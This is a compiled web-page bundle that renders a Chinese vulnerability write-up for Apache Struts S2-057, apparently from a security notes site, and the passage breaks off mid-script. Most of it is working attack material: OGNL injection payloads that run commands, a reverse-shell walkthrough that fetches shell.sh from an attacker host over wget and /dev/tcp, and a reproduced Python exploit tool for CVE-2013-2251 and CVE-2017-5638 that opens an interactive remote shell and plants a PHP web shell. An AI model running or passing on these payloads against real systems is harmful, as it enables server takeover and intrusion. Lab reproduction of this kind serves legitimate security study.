import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const c={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"漏洞详情：",-1),d={href:"https://cwiki.apache.org/confluence/display/WW/S2-057",target:"_blank",rel:"noopener noreferrer"},k={href:"https://lgtm.com/blog/apache_struts_CVE-2018-11776",target:"_blank",rel:"noopener noreferrer"},v={href:"https://xz.aliyun.com/t/2618",target:"_blank",rel:"noopener noreferrer"},m={href:"https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg",target:"_blank",rel:"noopener noreferrer"},b=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本：Struts &lt;= 2.3.34、Struts 2.5.16</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-057测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>启动环境后，访问<code>http://your-ip:8080/orders.xhtml</code>即可看到showcase页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>S2-057 需要以下条件：</p><ul><li><code>alwaysSelectFullNamespace</code>为真</li><li>操作元素没有设置命名空间属性，或者使用通配符</li></ul><p>命名空间会被用户从uri传递过来，解析为OGNL表达式，最终导致远程代码执行漏洞。</p><p>有效载荷：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021332977.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到Location头中已经返回了233*233的结果。</p>`,14),g={href:"https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg",target:"_blank",rel:"noopener noreferrer"},q=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>\${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>成功执行<code>id</code>命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021344166.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /struts2-showcase/$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27wget%20192.168.174.128/shell.sh%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /struts2-showcase/$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27bash%20shell.sh%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021345950.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><h3 id="exp-1" tabindex="-1"><a class="header-anchor" href="#exp-1" aria-hidden="true">#</a> EXP 1</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> future <span class="token keyword">import</span> standard_library
standard_library<span class="token punctuation">.</span>install_aliases<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">input</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> readline
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

RED <span class="token operator">=</span> <span class="token string">&#39;\\033[1;31m&#39;</span>
BLUE <span class="token operator">=</span> <span class="token string">&#39;\\033[94m&#39;</span>
BOLD <span class="token operator">=</span> <span class="token string">&#39;\\033[1m&#39;</span>
GREEN <span class="token operator">=</span> <span class="token string">&#39;\\033[32m&#39;</span>
OTRO <span class="token operator">=</span> <span class="token string">&#39;\\033[36m&#39;</span>
YELLOW <span class="token operator">=</span> <span class="token string">&#39;\\033[33m&#39;</span>
ENDC <span class="token operator">=</span> <span class="token string">&#39;\\033[0m&#39;</span>

<span class="token keyword">def</span> <span class="token function">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;clear&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;cls&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">&#39;nt&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
cls<span class="token punctuation">(</span><span class="token punctuation">)</span>

logo <span class="token operator">=</span> BLUE<span class="token operator">+</span><span class="token triple-quoted-string string">&#39;&#39;&#39;
  ___   _____  ___    _   _  _____  ___
 (  _\`\\(_   _)|  _\`\\ ( ) ( )(_   _)(  _\`\\
 | (_(_) | |  | (_) )| | | |  | |  | (_(_)
 \`\\__ \\  | |  | ,  / | | | |  | |  \`\\__ \\
 ( )_) | | |  | |\\ \\ | (_) |  | |  ( )_) |
 \`\\____) (_)  (_) (_)(_____)  (_)  \`\\____)

        =[ Command Execution v3]=
              By @s1kr10s
&#39;&#39;&#39;</span><span class="token operator">+</span>ENDC
<span class="token keyword">print</span><span class="token punctuation">(</span>logo<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot; * Ejemplo: http(s)://www.victima.com/files.login\\n&quot;</span><span class="token punctuation">)</span>
host <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] HOST: &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> host<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;https://&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> host<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>

        poc <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}&quot;</span>

        <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{&quot;</span><span class="token operator">+</span>comando<span class="token operator">+</span><span class="token string">&quot;}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}&quot;</span>
            <span class="token keyword">return</span> exploit

        <span class="token keyword">def</span> <span class="token function">exploit2</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit2 <span class="token operator">=</span> <span class="token string">&quot;Content-Type:%{(+++#_=&#39;multipart/form-data&#39;).(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell=&#39;&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&#39;).(+++#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(+++#shells=(+++#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#shell}:{&#39;/bin/sh&#39;,&#39;-c&#39;,#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}&quot;</span>
            <span class="token keyword">return</span> exploit2

        <span class="token keyword">def</span> <span class="token function">exploit3</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit3 <span class="token operator">=</span> <span class="token string">&quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&quot;</span><span class="token operator">+</span>comando<span class="token operator">+</span><span class="token string">&quot;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span>
            <span class="token keyword">return</span> exploit3

        <span class="token keyword">def</span> <span class="token function">pwnd</span><span class="token punctuation">(</span>shellfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploitfile <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{&quot;</span><span class="token operator">+</span>shellfile<span class="token operator">+</span><span class="token string">&quot;}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}&quot;</span>
            <span class="token keyword">return</span> exploitfile

        <span class="token keyword">def</span> <span class="token function">validador</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            arr_lin_win <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;file%20/etc/passwd&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;dir&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;net%20users&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;/sbin/ifconfig&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;cat%20/etc/passwd&quot;</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> arr_lin_win

        <span class="token comment">#def reversepl(ip,port):</span>
        <span class="token comment">#       print &quot;perl&quot;</span>

        <span class="token comment">#def reversepy(ip,port):</span>
        <span class="token comment">#       print &quot;python&quot;</span>

        <span class="token comment"># CVE-2013-2251 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
            response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>poc<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Servidor no responde\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;\\n [+] EJECUTANDO EXPLOIT CVE-2013-2251&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

        <span class="token keyword">if</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;mamalo&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
            owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
            owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

            opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            <span class="token comment">#print BOLD+&quot;   * [SHELL REVERSA]&quot;+ENDC</span>
            <span class="token comment">#print OTRO+&quot;     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\\n&quot;+ENDC</span>
            <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;   * [UPLOAD SHELL]&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>OTRO<span class="token operator">+</span><span class="token string">&quot;     Struts@Shell:$ pwnd (php)\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

                <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                    separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;Struts2@Shell_1:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    espacio <span class="token operator">=</span> separador<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">)</span>
                    comando <span class="token operator">=</span> <span class="token string">&quot;&#39;,&#39;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>espacio<span class="token punctuation">)</span>

                    <span class="token keyword">if</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;reverse&#39;</span> <span class="token keyword">and</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;pwnd&#39;</span><span class="token punctuation">:</span>
                        shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit<span class="token punctuation">(</span><span class="token string">&quot;&#39;&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&#39;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">elif</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;pwnd&#39;</span><span class="token punctuation">:</span>
                        pathsave<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;path EJ:/tmp/: &quot;</span><span class="token punctuation">)</span>

                        <span class="token keyword">if</span> espacio<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;php&#39;</span><span class="token punctuation">:</span>
                            shellfile <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&#39;python&#39;,&#39;-c&#39;,&#39;f%3dopen(&quot;/tmp/status.php&quot;,&quot;w&quot;);f.write(&quot;&lt;?php%20system($_GET[ksujenenuhw])?&gt;&quot;)&#39;&quot;&quot;&quot;</span>
                            urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>pwnd<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>shellfile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit<span class="token punctuation">(</span><span class="token string">&quot;&#39;ls&#39;,&#39;-l&#39;,&#39;&quot;</span><span class="token operator">+</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php&#39;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">if</span> shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span>GREEN<span class="token operator">+</span><span class="token string">&quot;\\nCreate File Successfull :) [&quot;</span><span class="token operator">+</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php]\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                            <span class="token keyword">else</span><span class="token punctuation">:</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span>RED<span class="token operator">+</span><span class="token string">&quot;\\nNo Create File :/\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

        <span class="token comment"># CVE-2017-5638 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] EJECUTANDO EXPLOIT CVE-2017-5638&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> x <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            valida <span class="token operator">=</span> validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> exploit2<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>valida<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;ASCII&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;No such&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Directory of&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Volume Serial&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;inet&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;root:&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;uid=&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;accounts&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Cuentas&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

                    opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

                        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                            <span class="token keyword">try</span><span class="token punctuation">:</span>
                                separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;\\nStruts2@Shell_2:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                                req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> exploit2<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>separador<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
